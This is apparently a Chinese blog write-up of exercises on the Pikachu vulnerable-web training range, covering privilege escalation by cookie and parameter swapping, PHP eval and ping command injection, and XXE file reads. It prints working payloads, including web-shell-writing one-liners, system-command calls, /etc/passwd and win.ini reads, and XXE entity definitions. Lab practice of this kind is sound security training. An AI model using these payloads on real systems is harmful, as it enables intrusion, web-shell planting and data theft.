---
title: "Pikachu 靶场复现（二）：越权 / RCE / XXE"
date: 2026-08-23 00:00:00 +0800
categories: [漏洞复现, Web安全]
tags: [Pikachu, 越权, IDOR, RCE, XXE]
---

本篇汇总 Pikachu 靶场中越权（水平/垂直）、RCE、XXE 三类漏洞的复现过程，按漏洞类型分节记录。

## 越权 - 垂直越权

提示信息：这里有两个用户admin/123456,pikachu/000000,admin是超级boss
很明显这一关是pikachu这个用户能实现admin用户独有的操作就证明存在垂直越权
我们先看一下这两个用户有哪些权限是不同的
pikachu账号只有查看权限，而admin在其之上多了添加和删除权限，如果能让pikachu执行添加和删除其中至少一个就证明存在垂直越权
![pasted image 20260823195544](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823195544.png)
![pasted image 20260823195640](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823195640.png)

如下为admin账号添加用户的数据包，如果把cookie换成pikachu的能成功添加账号就能证明存在越权
![pasted image 20260823200220](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823200220.png)

将cookie改成pikachu账号的之后，发现账号还是创建成功了，实现垂直越权
![pasted image 20260823200631](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823200631.png)
![pasted image 20260823200754](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823200754.png)

使用admin账号删除了id=1的用户为lili的账户
![pasted image 20260823201019](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823201019.png)

但是当我换pikachu的cookie准备执行删除操作时，就不能操作成功，看来这一关只能在增加用户上实现越权

## 越权 - 水平越权

水平越权，我们先登录一个账号
点击查看个人信息之后就能看见自己登录账号的个人信息了
![pasted image 20260822235554](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260822235554.png)

这一关是水平越权，而且点击查看个人信息之后，观察url就会发现这个通过get方法将lucy进行传参了，而且这里如果没有校验的话，就可以实现直接改参数越权查看别人的个人信息
这里我们尝试一下，果然能查看到别人的个人信息
![pasted image 20260823000119](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823000119.png)

## RCE - exec "evel"

这里的eval()是**直接运行 PHP 代码**，调用 PHP 函数 fopen/fputs 写 webshell
payload：phpinfo();
![pasted image 20260820164927](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260820164927.png)

这里汇总一下eval() 里面能写哪些php代码
## 1、输出查看类（回显，快速测试）

```
phpinfo();                     //查看PHP环境信息
echo "hello world";            //直接输出文字
var_dump($_SERVER);            //打印服务器全部环境变量
print_r(get_defined_constants(true));  //打印PHP常量
```

## 2、执行操作系统命令（PHP调用系统shell）
使用PHP的`system()` / `shell_exec()`等函数调用系统命令，Windows用ipconfig，Linux用whoami。

```
system("ipconfig");            //Windows，执行系统命令ipconfig，直接输出结果
system("whoami");              //Linux，查看当前系统用户
echo shell_exec("ipconfig");   //shell_exec把结果返回，需要echo打印
passthru("ipconfig");          //直接输出命令原始输出
```

## 3、文件读取（读服务器文件）

```
echo file_get_contents("C:/Windows/win.ini");   //Windows读文件
echo file_get_contents("/etc/passwd");          //Linux读账号文件
readfile("C:/Windows/win.ini");
```

## 4、写文件（生成一句话木马，靶场最常用）

fputs写法

```
fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"]);?>');
//会在当前目录生成一个shell.php文件，可以使用蚁剑连接
```

file_put_contents简写，更短

```
file_put_contents("shell2.php",'<?php @eval($_POST["a"]);?>');
```

执行后网站目录生成shell.php，蚁剑连接，密码`a`。
## 5、多语句同时执行，用分号隔开

```
phpinfo();system("ipconfig");
```

## 6、其他常用

```
highlight_file(__FILE__);   //查看当前PHP源码，这句payload在这里用不了，但我还是写在这里了
var_dump(scandir("."));     //列出当前目录所有文件
```

## RCE - exec "ping"

exex "ping"
这里的漏洞函数是shell_exec()，是操作系统命令，可以用以下payload

payload：127.0.0.1&type C:\Windows\win.ini
在Windows环境中CMD 里& = Linux 的; 含义是**顺序执行**（不管前面是否成功）
![pasted image 20260820163518](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260820163518.png)

payload：127.0.0.1|type C:\Windows\win.ini
这里用管道符也行（前面的输出作为后面的输入）
但是这里type（等价 Linux 的`cat`），是CMD 内置命令，用来输出文本文件内容到控制台。是不会是不会读取管道符输入的，所以会出现下面的效果
![pasted image 20260820163451](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260820163451.png)

## XXE - XXE漏洞

payload：

```
<!DOCTYPE note [
    <!ENTITY xxe SYSTEM "file:///D:/software/phpstudy/phpstudy_pro/WWW/pikachu/vul/xxe/1.txt">
]>
<note>&xxe;</note>
```

![pasted image 20260820175749](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260820175749.png)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY x SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&x;</foo>
```

![pasted image 20260823201900](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260823201900.png)

```
<!DOCTYPE note [
    <!-- 外部参数实体，加载本地的dtd文件，file协议合法 -->
    <!ENTITY % remote SYSTEM "file:///D:/software/phpstudy/phpstudy_pro/WWW/pikachu/vul/xxe/evil.dtd">
    %remote;
]>
<note>test</note>
```
